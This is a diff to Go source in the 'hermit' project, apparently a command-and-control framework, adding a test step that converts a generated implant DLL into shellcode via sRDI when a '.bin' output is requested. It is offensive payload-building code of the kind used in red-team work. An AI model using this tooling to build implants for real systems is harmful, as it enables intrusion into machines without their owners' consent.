@@ -10,8 +10,10 @@ import (
 	"github.com/hideckies/hermit/pkg/common/crypt"
 	"github.com/hideckies/hermit/pkg/common/meta"
 	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
+	"github.com/hideckies/hermit/pkg/common/stdout"
 	"github.com/hideckies/hermit/pkg/common/utils"
 	"github.com/hideckies/hermit/pkg/server/listener"
+	utilsSRDI "github.com/hideckies/hermit/pkg/server/payload/utils"
 	"github.com/hideckies/hermit/pkg/server/state"
 )
 
@@ -229,6 +231,55 @@ func (i *Implant) Generate(serverState *state.ServerState) (data []byte, outFile
 
 		os.Remove(asmSysObj)
 		os.Remove(asmRflObj)
+
+		// TEST ------------------------------------------------------------------------------
+		// If the format is '.bin', convert DLL to shellcode
+		if strings.HasSuffix(outFile, ".bin") {
+			dllFile := strings.Replace(outFile, ".bin", ".dll", -1)
+
+			// outText, err = meta.ExecCommand(
+			// 	"python3",
+			// 	"script/dll_to_shellcode.py",
+			// 	"-f",
+			// 	"ReflectiveLoader",
+			// 	strings.Replace(outFile, ".bin", ".dll", -1),
+			// )
+			// if err != nil {
+			// 	os.Chdir(serverState.CWD)
+			// 	// Remove .dll file
+			// 	removeErr := os.Remove(strings.Replace(outFile, ".bin", ".dll", -1))
+			// 	if removeErr != nil {
+			// 		stdout.LogFailed(fmt.Sprintf("Error: %s", removeErr))
+			// 	}
+			// 	return nil, "", fmt.Errorf("dll_to_shellcode error: %v", err)
+			// }
+			// if strings.Contains(strings.ToLower(outText), "exception:") || strings.Contains(strings.ToLower(outText), "error") {
+			// 	os.Chdir(serverState.CWD)
+			// 	// Remove .dll file
+			// 	removeErr := os.Remove(strings.Replace(outFile, ".bin", ".dll", -1))
+			// 	if removeErr != nil {
+			// 		stdout.LogFailed(fmt.Sprintf("Error: %s", removeErr))
+			// 	}
+			// 	return nil, "", fmt.Errorf("dll_to_shellcode error: %v", outText)
+			// }
+
+			_, err := utilsSRDI.GenerateSRDIShellcode(dllFile, "Start")
+			if err != nil {
+				// Remove .dll file
+				removeErr := os.Remove(dllFile)
+				if removeErr != nil {
+					stdout.LogFailed(fmt.Sprintf("Error: %s", removeErr))
+				}
+				return nil, "", fmt.Errorf("sRDI Error: %v", err)
+			}
+
+			// Remove .dll file
+			removeErr := os.Remove(dllFile)
+			if removeErr != nil {
+				stdout.LogFailed(fmt.Sprintf("Error: %s", removeErr))
+			}
+		}
+		// ---------------------------------------------------------------------------------------
 	}
 
 	data, err = os.ReadFile(outFile)
